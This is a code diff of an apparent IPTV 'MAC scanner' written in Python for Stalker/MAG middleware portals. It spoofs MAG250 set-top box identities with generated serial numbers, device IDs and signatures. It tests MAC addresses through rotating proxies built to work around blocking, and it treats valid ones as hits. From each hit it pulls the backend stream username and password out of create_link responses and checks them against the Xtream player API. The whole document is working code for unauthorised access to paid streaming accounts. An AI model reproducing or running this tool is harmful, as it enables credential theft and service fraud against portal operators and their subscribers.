-        profile = get_profile(url, mac, token, portal_type, token_random, proxy)
-        
-        exp_billing = None
-        if profile and isinstance(profile, dict):
-            exp_billing = profile.get("expire_billing_date")
-            result["client_ip"] = profile.get("ip")
-            
-            if exp_billing:
-                try:
-                    from datetime import datetime as dt
-                    dt_object = dt.strptime(exp_billing, "%Y-%m-%d %H:%M:%S")
-                    exp_billing = dt_object.strftime("%B %d, %Y, %I:%M %p")
-                except (ValueError, TypeError):
-                    pass
-        
-        # Step 3: Get account info (like original)
-        account_info = get_account_info(url, mac, token, portal_type, token_random, proxy)
-        
-        if not account_info or not isinstance(account_info, dict):
-            return False, result
-        
-        acc_mac = account_info.get("mac")
-        phone = account_info.get("phone")
-        
-        # Original check: both mac AND phone must be present
-        if acc_mac is None or phone is None:
-            return False, result
-        
-        # Process expiry
-        expiry = phone
-        if expiry == "":
-            expiry = "Unknown"
-            if exp_billing:
-                expiry = exp_billing
+        # Check for 401 (MAC expired during scan)
+        if resp.status_code == 401:
+            return False, {"mac": mac, "error": "401 during profile"}
         
         try:
-            timestamp = int(expiry)
-            from datetime import datetime as dt
-            expiry = dt.utcfromtimestamp(timestamp).strftime("%B %d, %Y, %I:%M %p")
-        except (ValueError, TypeError):
-            pass
+            data = resp.json()
+        except (json.JSONDecodeError, ValueError):
+            raise ProxySlowError("Invalid JSON in get_profile")
         
-        result["expiry"] = expiry
+        if "js" in data:
+            result["client_ip"] = data["js"].get("ip")
+            if data["js"].get("expire_billing_date"):
+                result["expiry"] = data["js"]["expire_billing_date"]
+    except (ProxyDeadError, ProxySlowError, ProxyBlockedError):
+        raise  # Retry with different proxy
+    except:
+        pass  # Continue with partial data
+    
+    # Step 2: get_main_info for expiry (critical)
+    try:
+        main_url = f"{base_url}/{portal_type}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
+        resp = do_request(main_url, cookies, headers, proxies, timeout)
         
-        # Step 4: Get all channels count (like original)
-        channels_count = get_all_channels(url, mac, token, portal_type, token_random, proxy, timeout)
-        result["channels"] = channels_count
+        if resp.status_code == 401:
+            return False, {"mac": mac, "error": "401 during main_info"}
         
-        # Only continue if channels > 0 (like original)
-        if channels_count > 0:
-            # Step 5: Get stream info for backend/credentials (like original)
-            backend_url, username, password = get_stream_info(url, mac, token, portal_type, token_random, proxy, timeout)
-            result["backend_url"] = backend_url
-            result["username"] = username
-            result["password"] = password
+        try:
+            data = resp.json()
+        except (json.JSONDecodeError, ValueError):
+            raise ProxySlowError("Invalid JSON in get_main_info")
+        
+        js = data.get("js", {})
+        expiry = js.get("phone", "")
+        if expiry:
+            try:
+                result["expiry"] = time.strftime("%B %d, %Y", time.gmtime(int(expiry)))
+            except:
+                result["expiry"] = str(expiry)
+    except (ProxyDeadError, ProxySlowError, ProxyBlockedError):
+        raise
+    except:
+        pass
+    
+    # Step 3: Channels (critical)
+    try:
+        ch_url = f"{base_url}/{portal_type}?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
+        resp = do_request(ch_url, cookies, headers, proxies, timeout)
+        
+        try:
+            data = resp.json()
+        except (json.JSONDecodeError, ValueError):
+            raise ProxySlowError("Invalid JSON in get_channels")
+        
+        if "js" in data and "data" in data["js"]:
+            result["channels"] = len(data["js"]["data"])
+    except (ProxyDeadError, ProxySlowError, ProxyBlockedError):
+        raise
+    except:
+        pass
+    
+    # Step 4: Genres (critical for DE detection)
+    try:
+        g_url = f"{base_url}/{portal_type}?type=itv&action=get_genres&JsHttpRequest=1-xml"
+        resp = do_request(g_url, cookies, headers, proxies, timeout)
+        
+        try:
+            data = resp.json()
+        except (json.JSONDecodeError, ValueError):
+            raise ProxySlowError("Invalid JSON in get_genres")
+        
+        if "js" in data:
+            result["genres"] = [g.get("title", "") for g in data["js"] if g.get("id") != "*"]
+    except (ProxyDeadError, ProxySlowError, ProxyBlockedError):
+        raise
+    except:
+        pass
+    
+    # Step 5: VOD categories (non-critical - no raise)
+    try:
+        v_url = f"{base_url}/{portal_type}?type=vod&action=get_categories&JsHttpRequest=1-xml"
+        resp = requests.get(v_url, cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
+        data = resp.json()
+        if "js" in data:
+            result["vod_categories"] = [c.get("title", "") for c in data["js"] if c.get("id") != "*"]
+    except:
+        pass
+    
+    # Step 6: Series categories (non-critical)
+    try:
+        s_url = f"{base_url}/{portal_type}?type=series&action=get_categories&JsHttpRequest=1-xml"
+        resp = requests.get(s_url, cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
+        data = resp.json()
+        if "js" in data:
+            result["series_categories"] = [c.get("title", "") for c in data["js"] if c.get("id") != "*"]
+    except:
+        pass
+    
+    # Step 7: Backend/Credentials (non-critical)
+    try:
+        link_url = f"{base_url}/{portal_type}?type=itv&action=create_link&cmd=http://localhost/ch/10000_&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml"
+        resp = requests.get(link_url, cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
+        data = resp.json()
+        cmd = data.get("js", {}).get("cmd", "")
+        if cmd:
+            cmd = cmd.replace("ffmpeg ", "").replace("'ffmpeg' ", "")
+            parsed = urlparse(cmd)
+            if parsed.hostname:
+                result["backend_url"] = f"{parsed.scheme}://{parsed.hostname}"
+                if parsed.port:
+                    result["backend_url"] += f":{parsed.port}"
+                parts = parsed.path.strip("/").split("/")
+                if len(parts) >= 2:
+                    result["username"], result["password"] = parts[0], parts[1]
+                    # Xtream API
+                    try:
+                        x_url = f"{result['backend_url']}/player_api.php?username={result['username']}&password={result['password']}"
+                        xr = requests.get(x_url, proxies=proxies, timeout=(3, 5))
+                        xd = xr.json().get("user_info", {})
+                        if "max_connections" in xd:
+                            result["max_connections"] = int(xd["max_connections"])
+                        if "created_at" in xd:
+                            result["created_at"] = time.strftime("%B %d, %Y", time.gmtime(int(xd["created_at"])))
+                    except:
+                        pass
+    except:
+        pass
+    
+    # MAC IS VALID - return with all collected data
+    return True, result
+
+
+# ============== PLAYER FUNCTIONS ==============
+
+def get_token(url, mac, proxy=None, timeout=10):
+    """Get token for player."""
+    base_url, portal_type = get_portal_info(url)
+    cookies = get_cookies(mac)
+    headers = get_headers()
+    proxies = parse_proxy(proxy)
+    
+    try:
+        handshake_url = f"{base_url}/{portal_type}?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
+        resp = requests.get(handshake_url, cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
+        data = resp.json()
+        token = data.get("js", {}).get("token")
+        token_random = data.get("js", {}).get("random")
+        
+        if token:
+            # Activate profile
+            sn, device_id, device_id2, hw_version_2 = generate_device_ids(mac)
+            headers = get_headers(token, token_random)
             
-            # Step 6: Get Xtream info if credentials found (like original)
-            if username and password and backend_url:
-                xtream_info = get_xtream_info(backend_url, username, password, timeout)
-                result["max_connections"] = xtream_info.get("max_connections")
-                result["active_cons"] = xtream_info.get("active_cons")
-                result["created_at"] = xtream_info.get("created_at")
+            if token_random:
+                sig = hashlib.sha256(str(token_random).encode()).hexdigest().upper()
+            else:
+                sig = hashlib.sha256(f"{sn}{mac}".encode()).hexdigest().upper()
             
-            # Step 7: Get genres (like original)
-            genres = get_genres(url, mac, token, portal_type, token_random, proxy)
-            if genres:
-                # Filter out "ALL" category like original
-                genres = [g for g in genres if g.get("id") != "*"]
-                result["genres"] = [g.get("title", "") for g in genres]
+            metrics = json.dumps({"mac": mac, "sn": sn, "type": "STB", "model": "MAG250", 
+                                  "uid": device_id, "random": token_random or 0})
             
-            # Step 8: Get VOD categories (like original)
-            vod_cats = get_vod_categories(url, mac, token, portal_type, token_random, proxy)
-            if vod_cats:
-                result["vod_categories"] = [v.get("title", "") for v in vod_cats if isinstance(v, dict)]
+            profile_url = f"{base_url}/{portal_type}?type=stb&action=get_profile&hd=1&sn={sn}&stb_type=MAG250&device_id={device_id2}&device_id2={device_id2}&sig={sig}&metrics={quote(metrics)}&hw_version_2={hw_version_2}&timestamp={int(time.time())}"
+            requests.get(profile_url, cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
             
-            # Step 9: Get Series categories
-            series_cats = get_series_categories(url, mac, token, portal_type, token_random, proxy)
-            if series_cats:
-                result["series_categories"] = [s.get("title", "") for s in series_cats if isinstance(s, dict)]
-        
-        logger.info(f"HIT! MAC: {mac} - Expiry: {expiry} - Channels: {channels_count}")
-        return True, result
-        
+            return token, token_random, portal_type, "5.3.1"
+    except:
+        pass
+    
+    return None, None, "portal.php", "5.3.1"
+
+
+def get_genres(url, mac, token, portal_type, token_random=None, proxy=None, timeout=10):
+    """Get live TV genres."""
+    base_url, _ = get_portal_info(url)
+    headers = get_headers(token, token_random)
+    cookies = get_cookies(mac)
+    proxies = parse_proxy(proxy)
+    
+    try:
+        resp = requests.get(f"{base_url}/{portal_type}?type=itv&action=get_genres&JsHttpRequest=1-xml",
+                           cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
+        return resp.json().get("js", [])
+    except:
+        return []
+
+
+def get_vod_categories(url, mac, token, portal_type, token_random=None, proxy=None, timeout=10):
+    """Get VOD categories."""
+    base_url, _ = get_portal_info(url)
+    headers = get_headers(token, token_random)
+    cookies = get_cookies(mac)
+    proxies = parse_proxy(proxy)
+    
+    try:
+        resp = requests.get(f"{base_url}/{portal_type}?type=vod&action=get_categories&JsHttpRequest=1-xml",
+                           cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
+        return resp.json().get("js", [])
+    except:
+        return []
+
+
+def get_series_categories(url, mac, token, portal_type, token_random=None, proxy=None, timeout=10):
+    """Get series categories."""
+    base_url, _ = get_portal_info(url)
+    headers = get_headers(token, token_random)
+    cookies = get_cookies(mac)
+    proxies = parse_proxy(proxy)
+    
+    try:
+        resp = requests.get(f"{base_url}/{portal_type}?type=series&action=get_categories&JsHttpRequest=1-xml",
+                           cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
+        return resp.json().get("js", [])
+    except:
+        return []
+
+
+def get_channels(url, mac, token, portal_type, category_type, category_id, token_random=None, proxy=None, timeout=10):
+    """Get channels for category."""
+    base_url, _ = get_portal_info(url)
+    headers = get_headers(token, token_random)
+    cookies = get_cookies(mac)
+    proxies = parse_proxy(proxy)
+    
+    type_map = {"IPTV": "itv", "VOD": "vod", "Series": "series"}
+    t = type_map.get(category_type, "itv")
+    param = "genre" if t == "itv" else "category"
+    
+    try:
+        resp = requests.get(f"{base_url}/{portal_type}?type={t}&action=get_ordered_list&{param}={category_id}&p=1&JsHttpRequest=1-xml",
+                           cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
+        data = resp.json()
+        channels = data.get("js", {}).get("data", [])
+        total = data.get("js", {}).get("total_items", len(channels))
+        return channels, total
+    except:
+        return [], 0
+
+
+def get_stream_url(url, mac, token, portal_type, cmd, token_random=None, proxy=None, timeout=10):
+    """Get stream URL for live channel."""
+    base_url, _ = get_portal_info(url)
+    headers = get_headers(token, token_random)
+    cookies = get_cookies(mac)
+    proxies = parse_proxy(proxy)
+    
+    try:
+        resp = requests.get(f"{base_url}/{portal_type}?type=itv&action=create_link&cmd={quote(cmd)}&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml",
+                           cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
+        cmd_val = resp.json().get("js", {}).get("cmd", "")
+        if cmd_val:
+            return cmd_val.replace("ffmpeg ", "").replace("'ffmpeg' ", "")
+    except:
+        pass
+    return None
+
+
+def get_vod_stream_url(url, mac, token, portal_type, cmd, token_random=None, proxy=None, timeout=10):
+    """Get stream URL for VOD."""
+    base_url, _ = get_portal_info(url)
+    headers = get_headers(token, token_random)
+    cookies = get_cookies(mac)
+    proxies = parse_proxy(proxy)
+    
+    try:
+        resp = requests.get(f"{base_url}/{portal_type}?type=vod&action=create_link&cmd={quote(cmd)}&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml",
+                           cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
+        cmd_val = resp.json().get("js", {}).get("cmd", "")
+        if cmd_val:
+            return cmd_val.replace("ffmpeg ", "").replace("'ffmpeg' ", "")
+    except:
+        pass
+    return None
+
+
+def test_proxy(proxy, timeout=5):
+    """Test if proxy works."""
+    try:
+        proxies = parse_proxy(proxy)
+        resp = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=(3, timeout))
+        return resp.status_code == 200, None
     except Exception as e:
-        logger.error(f"Error in full MAC test for {mac}: {e}")
-        return False, result
+        return False, str(e)
 
 
+def auto_detect_portal_url(base_url, proxy=None, timeout=5):
+    """Auto-detect portal endpoint."""
+    import re
+    base_url = base_url.rstrip('/')
+    parsed = urlparse(base_url)
+    host = parsed.hostname
+    port = parsed.port or 80
+    scheme = parsed.scheme or "http"
+    
+    if '/c' in parsed.path:
+        base, pt = get_portal_info(base_url)
+        return base_url, pt, "5.3.1"
+    
+    clean = f"{scheme}://{host}:{port}"
+    proxies = parse_proxy(proxy)
+    
+    for endpoint, pt in [("/c/", "portal.php"), ("/stalker_portal/c/", "stalker_portal/server/load.php")]:
+        try:
+            resp = requests.get(f"{clean}{endpoint}version.js", proxies=proxies, timeout=(3, timeout))
+            if resp.status_code == 200 and "var ver" in resp.text:
+                m = re.search(r"var ver = ['\"](.+?)['\"]", resp.text)
+                ver = m.group(1) if m else "5.3.1"
+                return f"{clean}{endpoint.rstrip('/')}", pt, ver
+        except:
+            pass
+    
+    return f"{clean}/c", "portal.php", "5.3.1"
